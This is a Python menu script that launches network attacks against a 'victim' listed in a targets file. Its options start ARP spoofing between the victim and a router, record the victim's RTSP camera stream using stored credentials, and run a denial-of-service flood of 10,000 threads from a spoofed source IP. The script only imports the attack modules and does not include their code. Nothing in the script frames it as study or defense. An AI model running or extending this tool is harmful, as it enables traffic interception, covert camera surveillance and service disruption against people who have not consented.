import sys
import threading
from time import sleep

class TargetLoader:
    def __init__(self, filepath):
        self.filepath = filepath

    def load_targets(self):
        config = {}
        with open(self.filepath, 'r') as file:
            for line in file:
                key, value = line.split('=')
                config[key.strip()] = value.strip()
        return config

class Menu:
    def __init__(self):
        self.loader = TargetLoader('targets.txt')
        self.running_tasks = []

    def run_arp_spoofing(self):
        from arp_spoof import ArpSpoofManager
        target_info = self.loader.load_targets()
        victim_ip = target_info['victim']
        router_ip = target_info['router']
        spoofer = ArpSpoofManager(victim_ip, router_ip)
        spoof_thread = threading.Thread(target=spoofer.run)
        spoof_thread.start()
        self.running_tasks.append(spoof_thread)
        print("ARP spoofing started...")

    def run_network_recording(self):
        from record_stream import StreamRecorder
        target_info = self.loader.load_targets()
        victim_ip = target_info['victim']
        username = target_info['username']
        password = target_info['password']
        url = f"rtsp://{username}:{password}@{victim_ip}/channel1"
        recorder = StreamRecorder(url, format='mkv')
        record_thread = threading.Thread(target=recorder.record)
        record_thread.start()
        self.running_tasks.append(record_thread)
        print("Network recording started...")

    def run_dos_attack(self):
        from DOS import DOSAttack
        target_info = self.loader.load_targets()
        try:
            duration = int(input("Enter the duration of the DOS attack in seconds: "))
        except ValueError:
            print("Invalid input! Using default duration of 60 seconds.")
            duration = 60
        dos = DOSAttack(target=target_info['victim'], port=8080, thread_count=10000, fake_ip='44.197.175.168',
                        duration=duration)
        dos_thread = threading.Thread(target=dos.start_attack)
        dos_thread.start()
        self.running_tasks.append(dos_thread)
        print(f"DOS attack started for {duration} seconds...")

    def display_menu(self):
        print("\n\nSelect an option:")
        print("1. Run ARP Spoofing")
        print("2. Run Network Recording")
        print("3. Run DOS Attack")
        print("4. Stop all tasks and Exit")

    def execute_choice(self, choice):
        if choice == '1':
            self.run_arp_spoofing()
        elif choice == '2':
            self.run_network_recording()
        elif choice == '3':
            self.run_dos_attack()
        elif choice == '4':
            print("Stopping all tasks and exiting...")
            for task in self.running_tasks:
                if task.is_alive():
                    task.join(1)  # Wait for 1 second for thread to respond
            exit()
        else:
            print("Invalid choice. Please try again.")

def main():
    menu = Menu()
    try:
        while True:
            menu.display_menu()
            choice = input("Enter your choice: ")
            menu.execute_choice(choice)
    except KeyboardInterrupt:
        print("\nMenu interrupted by user. Exiting.")
        sys.exit(0)

if __name__ == "__main__":
    main()
